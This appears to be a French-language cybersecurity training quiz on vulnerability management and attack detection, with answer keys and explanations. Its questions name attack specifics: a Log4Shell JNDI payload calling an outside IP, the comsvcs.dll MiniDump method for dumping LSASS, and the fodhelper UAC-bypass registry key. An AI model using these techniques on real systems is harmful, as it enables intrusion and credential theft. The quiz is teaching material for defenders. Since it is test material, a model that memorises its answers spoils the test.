@@ -1,0 +1,161 @@
+# MODULE 7 – VULNERABILITY MANAGEMENT AND ATTACK TECHNIQUES
+
+## F|Vulnerability Management / CVE
+Qu'est-ce qu'un identifiant CVE ?
++ Un identifiant unique et public attribué à une vulnérabilité de sécurité connue.
+- Un score de gravité de 0 à 10 calculé par le NIST pour chaque produit vulnérable.
+- Un correctif publié par l'éditeur.
+- Une signature antivirale.
+> Le programme CVE (Common Vulnerabilities and Exposures), géré par MITRE et financé par la CISA, attribue des identifiants de la forme CVE-AAAA-NNNNN. Le score de gravité est fourni séparément par le CVSS, et la base NVD du NIST enrichit les CVE avec ce score et des références.
+
+## F|Vulnerability Management / CVSS
+Selon CVSS v3.1, quelle plage de score correspond à une sévérité « Critique » ?
++ 9,0 à 10,0.
+- 7,0 à 8,9.
+- 4,0 à 6,9.
+- 0,1 à 3,9.
+> Les plages qualitatives CVSS v3.x sont : Aucune (0,0), Faible (0,1–3,9), Moyenne (4,0–6,9), Élevée (7,0–8,9) et Critique (9,0–10,0). CVSS v4.0, publié en novembre 2023, conserve ces plages qualitatives tout en révisant les métriques.
+
+## F|Attack Techniques / Brute force
+Quelle différence existe entre une attaque par brute force classique et une attaque par password spraying ?
++ Le brute force teste de nombreux mots de passe sur un compte, le password spraying teste quelques mots de passe courants sur de nombreux comptes.
+- Le password spraying teste des mots de passe déjà divulgués sur leurs comptes d'origine, le brute force teste des combinaisons aléatoires sur tous les comptes.
+- Le brute force n'utilise jamais de dictionnaire.
+- Il n'y a aucune différence entre les deux techniques.
+> Le password spraying (T1110.003) évite le verrouillage des comptes en limitant le nombre d'essais par compte. Sa détection repose sur l'agrégation par IP source : de nombreux comptes différents en échec depuis une même source ou une même plage, sur une période donnée.
+
+## F|Attack Techniques / Phishing
+Quel enregistrement DNS permet de publier la politique indiquant aux serveurs destinataires comment traiter les e-mails échouant aux contrôles SPF et DKIM ?
++ DMARC.
+- MX.
+- PTR.
+- CNAME.
+> DMARC (enregistrement TXT sur _dmarc.domaine) définit une politique (none, quarantine, reject) et le reporting, en s'appuyant sur les résultats SPF et DKIM et sur l'alignement avec le domaine du champ From. MX désigne les serveurs de messagerie, PTR la résolution inverse et CNAME un alias.
+
+## F|Attack Techniques / Kill Chain
+Dans la Cyber Kill Chain de Lockheed Martin, quelle phase suit immédiatement l'« Exploitation » ?
++ L'Installation.
+- La Livraison (Delivery).
+- La Reconnaissance.
+- L'Armement (Weaponization).
+> Les sept phases sont : Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control et Actions on Objectives. Après l'exploitation d'une vulnérabilité, l'attaquant installe un mécanisme lui permettant de maintenir l'accès.
+
+## F|Vulnerability Management / Scan
+Quelle est la différence entre un scan de vulnérabilités authentifié et non authentifié ?
++ Le scan authentifié inspecte configuration et versions installées : résultats plus complets et plus fiables.
+- Le scan non authentifié est toujours plus précis.
+- Le scan authentifié exploite automatiquement les vulnérabilités trouvées pour confirmer leur présence, ce qui le réserve aux environnements de test.
+- Le scan non authentifié nécessite des droits d'administrateur de domaine.
+> Un scan authentifié (credentialed) accède au registre, aux paquets installés et aux fichiers de configuration. Le scan non authentifié ne voit que ce qui est exposé sur le réseau, comme le ferait un attaquant externe. Les deux approches sont complémentaires.
+
+## I|Vulnerability Management / Priorisation
+Deux vulnérabilités sont détectées : l'une CVSS 9,8 sur un serveur de test isolé, l'autre CVSS 7,5 sur un serveur web exposé sur Internet et présente dans le catalogue CISA KEV. Laquelle traiter en priorité ?
++ La vulnérabilité CVSS 7,5 du serveur exposé, car elle est activement exploitée et l'actif est accessible depuis Internet.
+- La vulnérabilité CVSS 9,8, car le score de base reflète le risque réel pour l'organisation et doit toujours déterminer l'ordre de correction.
+- Aucune, car les deux scores sont inférieurs à 10.
+- Les deux doivent attendre la prochaine fenêtre de maintenance annuelle.
+> La priorisation basée sur le risque combine la sévérité, l'exploitabilité réelle (KEV, EPSS), l'exposition et la criticité de l'actif. Une vulnérabilité exploitée sur un système exposé présente un risque bien supérieur à un score théorique élevé sur un système isolé.
+
+## I|Vulnerability Management / EPSS
+Quelle information fournit l'EPSS (Exploit Prediction Scoring System) ?
++ La probabilité qu'une vulnérabilité soit exploitée dans les 30 prochains jours.
+- La gravité technique intrinsèque d'une vulnérabilité, selon les métriques d'exploitabilité et d'impact.
+- La liste des correctifs publiés par l'éditeur.
+- Le nombre d'actifs vulnérables dans l'entreprise.
+> L'EPSS, maintenu par le FIRST, estime la probabilité d'exploitation à 30 jours à partir de données observées. Il complète le CVSS, qui mesure la sévérité, pour aider à concentrer les efforts de correction sur les vulnérabilités les plus susceptibles d'être exploitées.
+
+## I|Attack Techniques / Credential dumping
+Sysmon Event ID 10 montre un processus rundll32.exe accédant à lsass.exe avec un GrantedAccess de 0x1FFFFF, la ligne de commande contenant comsvcs.dll MiniDump. Quelle technique est observée ?
++ Le vol d'identifiants par dump de la mémoire de LSASS (T1003.001).
+- L'élévation de privilèges par contournement de l'UAC via rundll32.
+- Un scan réseau ARP.
+- Une découverte de partages réseau.
+> La fonction MiniDump de comsvcs.dll, appelée via rundll32, est une technique connue pour dumper LSASS sans outil externe. Le dump contient des hashs NTLM, voire des tickets Kerberos. Les contre-mesures incluent LSA Protection (RunAsPPL), Credential Guard et les règles ASR.
+
+## I|Attack Techniques / Kerberoasting
+Un analyste observe de nombreux événements 4769 émis par un même utilisateur pour des comptes de service différents, avec un type de chiffrement 0x17. Quelle attaque est probable ?
++ Le Kerberoasting : demande de tickets de service chiffrés en RC4 afin de casser hors ligne le mot de passe des comptes de service.
+- Une attaque pass-the-ticket utilisant des tickets TGS volés en mémoire pour accéder aux comptes de service, sans cassage de mot de passe.
+- Un Golden Ticket forgé avec le hash KRBTGT.
+- Un brute force sur le protocole RDP.
+> Le Kerberoasting (T1558.003) exploite le fait que tout utilisateur authentifié peut demander un ticket TGS pour un compte possédant un SPN. Le chiffrement RC4 (0x17) facilite le cassage hors ligne. Les contre-mesures incluent des mots de passe longs pour les comptes de service, les gMSA et l'imposition d'AES.
+
+## I|Attack Techniques / Pass-the-Hash
+Quel indicateur peut suggérer une attaque pass-the-hash dans les journaux Windows ?
++ Des 4624 de type 3 en NTLM pour un compte privilégié, depuis un poste inhabituel et sans trace Kerberos.
+- Des événements 4625 répétés avec le sous-statut 0xC000006A sur un même compte, suivis d'un événement 4740 de verrouillage.
+- Un événement 1102 sur un poste utilisateur.
+- Un événement 6006 indiquant l'arrêt du journal d'événements.
+> Le pass-the-hash (T1550.002) réutilise un hash NTLM sans connaître le mot de passe. Une authentification NTLM réseau d'un compte administrateur depuis une machine inhabituelle, dans un environnement où Kerberos est la norme, est suspecte. Microsoft Defender for Identity propose des détections dédiées.
+
+## I|Attack Techniques / Élévation de privilèges
+Un attaquant découvre un service Windows exécuté en SYSTEM dont le chemin est C:\Program Files\App Folder\service.exe, sans guillemets, et constate qu'il peut écrire un fichier dans C:\Program Files\. Quelle vulnérabilité exploite-t-il ?
++ Un chemin de service non entre guillemets (unquoted service path) permettant l'exécution d'un binaire malveillant avec les privilèges du service.
+- Une injection SQL dans le service.
+- Un détournement de l'ordre de recherche des DLL du service, qui charge une bibliothèque depuis le répertoire de travail de l'utilisateur.
+- Un défaut de configuration du DNS.
+> Si le chemin n'est pas entre guillemets et contient des espaces, Windows tente successivement C:\Program.exe, puis C:\Program Files\App.exe, etc. Un attaquant capable d'écrire à l'un de ces emplacements peut obtenir l'exécution avec les privilèges du service, souvent SYSTEM (T1574.009).
+
+## I|Attack Techniques / Mouvement latéral
+Quel indicateur Windows est caractéristique d'une connexion RDP réussie sur un serveur ?
++ Un événement 4624 avec un logon type 10 (RemoteInteractive).
+- Un événement 4624 avec un logon type 5 (Service).
+- Un événement 4625 avec un logon type 2.
+- Un événement 4634 avec un logon type 4 (Batch).
+> Le logon type 10 correspond aux sessions Terminal Services/RDP. Le type 2 est interactif local, le type 3 réseau, le type 4 batch (tâches planifiées), le type 5 service et le type 7 déverrouillage. Des connexions RDP de poste à poste ou depuis des comptes inhabituels sont des indicateurs de mouvement latéral (T1021.001).
+
+## I|Attack Techniques / Post-exploitation
+Après un accès initial, un attaquant exécute whoami /all, net group "Domain Admins" /domain, nltest /dclist et ipconfig /all. Quelle tactique MITRE ATT&CK est illustrée ?
++ Discovery (TA0007).
+- Exfiltration (TA0010).
+- Impact (TA0040).
+- Initial Access (TA0001).
+> Ces commandes servent à découvrir le contexte du compte, les groupes privilégiés, les contrôleurs de domaine et la configuration réseau. Leur exécution en rafale par un même processus en peu de temps est un indicateur de reconnaissance interne, souvent après un accès initial ou l'exécution d'un implant.
+
+## I|Attack Techniques / Phishing avancé
+Un utilisateur a saisi ses identifiants sur une page imitant Microsoft 365 ; malgré le MFA, l'attaquant accède à sa boîte aux lettres. Quelle technique explique ce contournement ?
++ Un phishing Adversary-in-the-Middle (AiTM) qui relaie l'authentification et vole le cookie de session après la validation MFA.
+- Un brute force du code MFA à 6 chiffres, rendu possible par l'absence de limitation du nombre de tentatives sur la page de connexion Microsoft.
+- Une attaque par injection SQL sur Entra ID.
+- Un ARP spoofing sur le réseau domestique de l'utilisateur.
+> Les kits AiTM (Evilginx, EvilProxy, Tycoon 2FA) se placent en proxy entre l'utilisateur et le vrai service : l'utilisateur effectue réellement son MFA et l'attaquant capture le cookie de session (T1557, T1539). Les méthodes résistantes au phishing (FIDO2, Windows Hello) et les politiques de conformité des appareils réduisent ce risque.
+
+## A|Attack Techniques / DCSync
+Un événement 4662 sur un contrôleur de domaine montre un compte utilisateur standard effectuant une opération avec les droits « Replicating Directory Changes All » (GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2). Quelle attaque est suspectée ?
++ Une attaque DCSync visant à récupérer les hashs des comptes du domaine, dont KRBTGT, en imitant un contrôleur de domaine.
+- Une réplication normale déclenchée par un contrôleur de domaine en lecture seule (RODC), qui utilise des comptes utilisateurs pour se synchroniser.
+- Une mise à jour de stratégie de groupe.
+- Une sauvegarde planifiée de l'Active Directory.
+> DCSync (T1003.006), notamment via Mimikatz lsadump::dcsync, utilise le protocole de réplication MS-DRSR. Une demande de réplication émanant d'un compte ou d'une machine qui n'est pas un contrôleur de domaine est hautement suspecte. Il faut vérifier les comptes disposant de ces droits et surveiller ces GUID.
+
+## A|Attack Techniques / Chaîne d'attaque
+Placez dans l'ordre logique ATT&CK les observations suivantes : (1) dump LSASS, (2) e-mail avec pièce jointe ISO, (3) connexion RDP vers un serveur de fichiers avec un compte admin, (4) archivage 7z puis envoi vers un service cloud.
++ 2, 1, 3, 4 : Initial Access, Credential Access, Lateral Movement, Exfiltration.
+- 1, 2, 4, 3 : Credential Access, Initial Access, Exfiltration, Lateral Movement.
+- 3, 4, 1, 2 : Lateral Movement, Exfiltration, Credential Access, Initial Access.
+- 4, 3, 2, 1 : Exfiltration, Lateral Movement, Initial Access, Credential Access.
+> Le scénario typique débute par l'accès initial (pièce jointe ISO, T1566.001), puis le vol d'identifiants (T1003.001), leur utilisation pour se déplacer (T1021.001) et enfin la collecte et l'exfiltration (T1560.001, T1567.002). Reconstituer cette chaîne aide à identifier les points de détection manqués.
+
+## A|Attack Techniques / UAC bypass
+L'EDR détecte une modification de la clé HKCU\Software\Classes\ms-settings\Shell\Open\command suivie de l'exécution de fodhelper.exe, qui lance cmd.exe en niveau d'intégrité élevé. De quoi s'agit-il ?
++ D'un contournement de l'UAC (T1548.002) exploitant un binaire auto-élevé qui lit une clé de registre contrôlable par l'utilisateur.
+- D'une configuration légitime des associations de fichiers de l'application Paramètres, qui s'exécute en intégrité élevée par conception.
+- D'une attaque Kerberoasting.
+- D'un déni de service sur le service Windows Update.
+> Fodhelper.exe est un binaire auto-élevé (autoElevate) qui consulte ms-settings dans HKCU. En y plaçant une commande, l'attaquant obtient une exécution en intégrité élevée sans invite UAC. La surveillance des modifications de cette clé (Sysmon 12/13) et de l'arbre de processus permet la détection.
+
+## A|Vulnerability Management / Exploitation d'application web
+Les journaux d'un serveur web montrent une requête GET contenant ${jndi:ldap://203.0.113.50:1389/a} dans l'en-tête User-Agent, suivie d'une connexion LDAP sortante du serveur vers cette IP. Quelle conclusion est la plus juste ?
++ Une exploitation de Log4Shell probablement réussie, puisque le serveur a contacté l'infrastructure de l'attaquant.
+- Un simple scan sans conséquence : la chaîne JNDI n'est interprétée que dans le corps d'une requête POST, jamais dans un en-tête HTTP.
+- Un comportement normal de la bibliothèque de journalisation.
+- Une attaque par injection SQL ayant échoué.
+> La chaîne ${jndi:ldap://...} est la signature de l'exploitation de Log4j. Une simple requête peut n'être qu'un scan, mais la connexion LDAP sortante du serveur démontre que la chaîne a été interprétée. Il faut traiter le serveur comme compromis : confinement, recherche de charges utiles et correction.
+
+## A|Attack Techniques / Golden vs Silver Ticket
+Quelle différence permet de distinguer un Silver Ticket d'un Golden Ticket lors d'une investigation ?
++ Le Silver Ticket est un TGS forgé avec le hash du compte de service : aucun 4769 n'apparaît sur le DC pour cet accès.
+- Le Silver Ticket nécessite le hash du compte KRBTGT et génère des événements 4768 sur le contrôleur de domaine, ce qui le rend plus facile à détecter.
+- Le Golden Ticket est limité à un seul service.
+- Les deux attaques génèrent obligatoirement des événements 4625.
+> Le Golden Ticket (T1558.001) est un TGT forgé avec le hash KRBTGT, donnant accès à tout le domaine. Le Silver Ticket (T1558.002) est un ticket de service forgé avec le hash du compte du service visé : il est présenté directement au service, ce qui le rend plus discret côté contrôleur de domaine. La détection repose alors sur les journaux du serveur cible et les anomalies de tickets (PAC, durées).
